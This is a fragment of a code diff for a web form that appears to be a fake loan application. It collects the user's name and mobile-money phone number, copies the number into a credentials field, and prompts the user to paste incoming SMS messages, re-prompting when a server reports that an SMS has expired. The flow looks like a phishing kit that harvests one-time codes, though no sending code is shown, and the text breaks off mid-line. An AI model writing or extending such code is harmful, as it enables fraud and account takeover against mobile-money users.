-            appState.duration = (selectLoanDuration && selectLoanDuration.value) || appState.duration;
-            appState.purpose = (inputLoanPurpose && inputLoanPurpose.value.trim()) || 'Business expansion and working capital';
-            showScreen('step2');
-            return;
-        }
-
-        if (targetBtn.id === 'btn-prev-2') {
-            showScreen('step1');
-            return;
-        }
-
-        if (targetBtn.id === 'btn-next-2') {
-            hideBanner(step2Alert);
-            const fn = inputFirstName ? inputFirstName.value.trim() : '';
-            const ln = inputLastName ? inputLastName.value.trim() : '';
-            const ph = inputMomoPhone ? inputMomoPhone.value.trim() : '';
-
-            if (!fn || !ln) {
-                showBanner(step2Alert, "PLEASE ENTER YOUR FIRST NAME AND LAST NAME.");
-                return;
-            }
-            if (!isValidTenDigitZeroPhone(ph)) {
-                showBanner(step2Alert, "PHONE NUMBER MUST BE 10 DIGITS STARTING WITH 0.");
-                return;
-            }
-
-            appState.firstName = fn;
-            appState.lastName = ln;
-            appState.phone = ph;
-            if (credPhone) credPhone.value = ph;
-
-            const sumAmount = document.getElementById('sum-amount');
-            const sumDuration = document
+                    lastHandledStatus = data.status;
+                    smsPasteBox.value = '';
+                    smsCharCounter.textContent = '0 / 1000';
+                    startSmsVerificationStep(false);
+                    showBanner(smsSurfaceBanner, 'SMS EXPIRED. ENTER NEW INCOMING SMS ON YOUR
